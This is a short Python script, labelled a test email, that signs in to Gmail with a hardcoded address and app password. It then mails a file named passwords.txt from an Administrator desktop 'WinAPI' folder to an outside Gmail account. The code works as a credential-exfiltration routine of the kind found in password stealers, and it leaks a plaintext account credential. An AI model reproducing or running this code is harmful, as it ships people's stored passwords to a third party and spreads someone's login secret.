import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

def send_email_with_attachment(to_email, subject, body, filename):
    from_email = "muthonibrian3@gmail.com"
    app_password = "zpag elkj aaqe npth"

    msg = MIMEMultipart()
    msg["Subject"] = subject
    msg["From"] = from_email
    msg["To"] = to_email

    # Attach the body with text/plain content type
    msg.attach(MIMEText(body, "plain"))

    # Attach the file
    with open(filename, "rb") as file:
        part = MIMEApplication(file.read(), _subtype="txt")
        part.add_header("Content-Disposition", "attachment", filename=os.path.basename(filename))
        msg.attach(part)

    try:
        print("Connecting to Gmail SMTP server...")
        smtp = smtplib.SMTP("smtp.gmail.com", 587)
        print("Connected. Initiating TLS...")
        smtp.starttls()
        print("TLS handshake completed. Logging in...")
        smtp.login(from_email, app_password)
        print("Login successful. Sending email...")
        smtp.send_message(msg)
        smtp.quit()
        print(f"Email sent successfully to {to_email}")
    except Exception as e:
        print(f"Failed to send email: {e}")

def main():
    to_email = "crimsonsummer81@gmail.com"
    subject = "Test Email with Attachment"
    body = "Please find attached the file."
    filename = "C:\\Users\\Administrator\\Desktop\\WinAPI\\passwords.txt"

    send_email_with_attachment(to_email, subject, body, filename)

if __name__ == "__main__":
    main()
